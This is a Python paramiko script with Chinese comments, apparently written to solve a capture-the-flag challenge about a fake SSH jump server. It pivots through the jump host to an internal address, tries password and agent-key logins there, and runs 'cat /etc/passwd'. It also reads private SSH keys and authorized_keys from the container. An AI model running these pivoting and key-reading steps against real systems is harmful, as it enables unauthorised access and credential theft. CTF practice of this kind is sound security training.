import paramiko
import socket
import time
import sys
import threading

"""
发现：
1. 172.17.0.1:22 返回的是真正的 OpenSSH_8.2p1 Ubuntu
2. 其他地址(localhost, 127.0.0.1, 10.0.2.2, 0.0.0.0, ::1)都返回dropbear

这确认了FakeJumpServer的设置！
dropbear伪造了除172.17.0.1之外的所有localhost相关地址。

现在我需要找到一种方法来认证到172.17.0.1。

让我尝试使用原生socket来避免paramiko的编码问题
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def manual_ssh_through_tunnel():
    """手动通过隧道进行SSH"""
    print("[*] 手动SSH隧道测试")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 打开到172.17.0.1:22的通道
    try:
        channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0), timeout=10)
        channel.settimeout(30)
        
        # 读取OpenSSH banner
        banner = b""
        while True:
            byte = channel.recv(1)
            banner += byte
            if byte == b"\n":
                break
        
        print(f"OpenSSH Banner: {banner}")
        
        # 发送我们的banner
        channel.send(b"SSH-2.0-ParamikoTest\r\n")
        
        # 读取KEX init
        time.sleep(0.5)
        kex_data = channel.recv(4096)
        print(f"KEX data received: {len(kex_data)} bytes")
        
        # 解析KEX init (至少查看支持的认证方法)
        # SSH_MSG_KEXINIT = 20
        if len(kex_data) > 5:
            packet_length = int.from_bytes(kex_data[0:4], 'big')
            padding_length = kex_data[4]
            msg_type = kex_data[5]
            print(f"Packet type: {msg_type}, length: {packet_length}")
        
        channel.close()
        
    except Exception as e:
        print(f"错误: {e}")
        import traceback
        traceback.print_exc()
    
    ssh.close()

def test_with_ssh_command():
    """
    思路：既然容器里可能没有ssh命令，
    但是我们可以用Python的paramiko在容器内执行
    
    等等，容器里有busybox！让我检查是否有dbclient（dropbear的客户端）
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 检查容器内的SSH客户端工具")
    
    # 检查可用的SSH客户端
    commands = [
        "which ssh",
        "which dbclient",
        "which dropbearclient",
        "busybox --list | grep -i ssh",
        "ls -la /usr/bin/*ssh* 2>/dev/null",
        "ls -la /bin/*ssh* 2>/dev/null",
        "file /bin/busybox",
    ]
    
    for cmd in commands:
        try:
            stdin, stdout, stderr = ssh.exec_command(cmd, timeout=5)
            result = stdout.read().decode() + stderr.read().decode()
            if result.strip():
                print(f"{cmd}: {result}")
        except Exception as e:
            print(f"{cmd}: Error - {e}")
    
    ssh.close()

def try_native_paramiko_to_ubuntu():
    """使用干净的paramiko连接到Ubuntu"""
    print("\n[*] 尝试干净的paramiko连接到172.17.0.1")
    
    # 首先建立到jumphost的连接
    jumphost = paramiko.SSHClient()
    jumphost.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    jumphost.connect(HOST, PORT, USER, PASSWD)
    
    jumphost_transport = jumphost.get_transport()
    
    # 创建到172.17.0.1:22的隧道
    local_addr = ('127.0.0.1', 0)
    remote_addr = ('172.17.0.1', 22)
    
    try:
        tunnel_channel = jumphost_transport.open_channel("direct-tcpip", remote_addr, local_addr, timeout=10)
        
        if tunnel_channel is None:
            print("无法打开隧道通道")
            return
        
        # 使用tunnel_channel作为socket创建SSH连接
        # 创建一个新的SSH客户端通过隧道
        target_ssh = paramiko.SSHClient()
        target_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # 使用通道作为socket
        # paramiko.Transport可以接受socket-like对象
        target_transport = paramiko.Transport(tunnel_channel)
        
        try:
            target_transport.start_client(timeout=15)
            print("SSH握手成功!")
            
            # 获取服务器密钥
            server_key = target_transport.get_remote_server_key()
            print(f"服务器密钥类型: {server_key.get_name()}")
            print(f"服务器密钥指纹: {server_key.get_base64()[:40]}...")
            
            # 尝试获取支持的认证方式
            try:
                target_transport.auth_none(USER)
            except paramiko.BadAuthenticationType as e:
                print(f"支持的认证方式: {e.allowed_types}")
            except Exception as e:
                print(f"auth_none错误: {e}")
            
            # 尝试密码认证
            try:
                target_transport.auth_password(USER, PASSWD)
                print("密码认证成功!")
                
                # 执行命令
                channel = target_transport.open_session()
                channel.exec_command("id; cat /etc/passwd; ls -la /")
                time.sleep(2)
                
                output = b""
                while channel.recv_ready():
                    output += channel.recv(4096)
                print(f"命令输出:\n{output.decode()}")
                
                channel.close()
                
            except paramiko.AuthenticationException as e:
                print(f"密码认证失败: {e}")
                
                # 尝试公钥认证（如果有agent）
                try:
                    # 尝试使用agent
                    agent = paramiko.Agent()
                    agent_keys = agent.get_keys()
                    print(f"Agent中有 {len(agent_keys)} 个密钥")
                    
                    for key in agent_keys:
                        try:
                            target_transport.auth_publickey(USER, key)
                            print(f"使用密钥 {key.get_base64()[:20]}... 认证成功!")
                            break
                        except:
                            pass
                except Exception as e:
                    print(f"Agent认证失败: {e}")
            
        except Exception as e:
            print(f"SSH握手失败: {e}")
            import traceback
            traceback.print_exc()
        finally:
            target_transport.close()
        
    except Exception as e:
        print(f"隧道创建失败: {e}")
    finally:
        tunnel_channel.close()
        jumphost.close()

def test_publickey_auth_172():
    """测试公钥认证到172.17.0.1"""
    print("\n[*] 测试公钥认证到172.17.0.1")
    
    # 首先在容器中生成密钥对
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查是否有现有的密钥
    try:
        stdin, stdout, stderr = ssh.exec_command("cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null", timeout=5)
        key_content = stdout.read().decode()
        if key_content:
            print(f"找到现有私钥:\n{key_content[:100]}...")
    except Exception as e:
        print(f"检查密钥失败: {e}")
    
    # 检查authorized_keys
    try:
        stdin, stdout, stderr = ssh.exec_command("cat ~/.ssh/authorized_keys 2>/dev/null", timeout=5)
        auth_keys = stdout.read().decode()
        if auth_keys:
            print(f"authorized_keys:\n{auth_keys}")
    except:
        pass
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 深入探索SSH隧道")
    print("="*60)
    
    test_with_ssh_command()
    
    print("\n" + "="*60)
    try_native_paramiko_to_ubuntu()
    
    print("\n" + "="*60)
    test_publickey_auth_172()
